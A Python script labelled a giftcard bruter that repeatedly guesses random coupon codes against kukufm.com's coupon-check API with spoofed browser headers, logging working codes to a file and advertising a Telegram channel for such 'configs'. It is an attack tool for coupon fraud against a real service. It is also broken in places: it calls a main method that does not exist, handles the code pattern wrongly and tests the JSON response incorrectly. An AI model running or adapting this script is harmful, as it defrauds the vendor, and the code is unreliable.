import os, re, time, random, threading, requests, easygui, datefinder
from colorama import Fore
from bs4 import BeautifulSoup

def center(var: str, space: int = None):  
    if not space:
        space = (os.get_terminal_size().columns- len(var.splitlines()[int(len(var.splitlines()) / 2)])) / 2
    
    return "\n".join((" " * int(space)) + var for var in var.splitlines())
    
class GiftcardBrute:
    def __init__(self):
        if os.name == "posix":
            print("WARNING: This program is designed to run on Windows only.")
            quit(1)
        self.proxies = []
        self.combos = []
        self.hits = 0
        self.bad = 0
        self.cpm = 0
        self.retries = 0
        self.lock = threading.Lock()
    

    def ui(self):
        os.system("cls && title [GIFTCARD BRUTER] - Made by YashvirGaming")
        text = """
                    
██╗   ██╗ █████╗ ███████╗██╗  ██╗██╗   ██╗██╗██████╗      ██████╗  █████╗ ███╗   ███╗██╗███╗   ██╗ ██████╗ 
╚██╗ ██╔╝██╔══██╗██╔════╝██║  ██║██║   ██║██║██╔══██╗    ██╔════╝ ██╔══██╗████╗ ████║██║████╗  ██║██╔════╝ 
 ╚████╔╝ ███████║███████╗███████║██║   ██║██║██████╔╝    ██║  ███╗███████║██╔████╔██║██║██╔██╗ ██║██║  ███╗
  ╚██╔╝  ██╔══██║╚════██║██╔══██║╚██╗ ██╔╝██║██╔══██╗    ██║   ██║██╔══██║██║╚██╔╝██║██║██║╚██╗██║██║   ██║
   ██║   ██║  ██║███████║██║  ██║ ╚████╔╝ ██║██║  ██║    ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║██║ ╚████║╚██████╔╝
   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚═╝  ╚═╝     ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝"""
                                 
        faded = ""
        red = 40
        for line in text.splitlines():
            faded += f"\033[38;2;{red};0;220m{line}\033[0m\n"
            if not red == 255:
                red += 15
                if red > 255:
                    red = 255
        print(center(faded))
        print(center(f"{Fore.LIGHTYELLOW_EX}\nt.me/imakeconfigs\n{Fore.RESET}"))

    def cpmCounter(self):
        while True:
            old = self.hits
            time.sleep(4)
            new = self.hits
            self.cpm = (new - old) * 15
    def updateTitle(self):
        while True:
            elapsed = time.strftime("%H:%M:%S", time.gmtime(time.time() - self.start))
            os.system(
                f"title [GIFTCARD BRUTER] - Hits: {self.hits} ^| Bad: {self.bad} ^| Retries: {self.retries} ^| CPM: {self.cpm} ^| Threads: {threading.active_count() - 3} ^| Time elapsed: {elapsed}"
            )
            time.sleep(0.4)            
        
def random_string(pattern):
    
    code = ''
    for char in pattern:
        if char == '?':
            code += random.choice('abcdefghijklmnopqrstuvwxyz')
        else:
            code += char
    return code
    
def check_coupon_apply(code):
    url = "https://kukufm.com/api/v1.1/orders/check-coupon-apply/"
    headers = {
        "Host": "kukufm.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Chrome/116.0",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Origin": "https://kukufm.com",
        "Connection": "keep-alive",
        "Referer": "https://kukufm.com/subscription/hindi",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "TE": "trailers"
    }
    payload = {
        "build_number": "undefined",
        "coupon_code": code,
        "premium_plan_id": 1
    }

    response = requests.post(url, headers=headers, data=payload)
    json_data = response.json()

    if "Invalid Coupon Code" in json_data or "Coupon Not Valid" in json_data:
        return {"success": False, "status": "Failure"}
    elif "Congratulations" in json_data:
        coupon_discount_amount = json_data.get("coupon_discount_amount", "N/A")
        valid_till = json_data.get("valid_till", "N/A")
        return {"success": True, "status": "Success", "coupon_discount_amount": coupon_discount_amount, "valid_till": valid_till}
    elif "Coupons are not allowed in" in json_data:
        return {"success": True, "status": "Retry"}
    elif "Coupon already used, please try another coupon" in json_data:
        return {"success": True, "status": "Coupon already used"}
    elif "EXPIRED" in json_data:
        return {"success": True, "status": "Custom", "custom_status": "EXPIRED"}
    else:
        return {"success": False, "status": "Unknown"}

code = random_string("FKS?u?u?d?d?u?d?d")

while True:
    result = check_coupon_apply(code)

    if result["success"]:
        print("Success:", code)
        print("Status:", result["status"])
        if result["status"] == "Success":
            print("Coupon Discount Amount:", result["coupon_discount_amount"])
            print("Valid Till:", result["valid_till"])
            config_data = f"Code = {code} | Join Telegram: @imakeconfigs"
            with open("code.txt", "a") as file:
                file.write(config_data + "\n")
    else:
        print("Failure:", code)
        code = random_string("FKS?u?u?d?d?u?d?d")


if __name__ == "__main__":
    GiftcardBrute().main()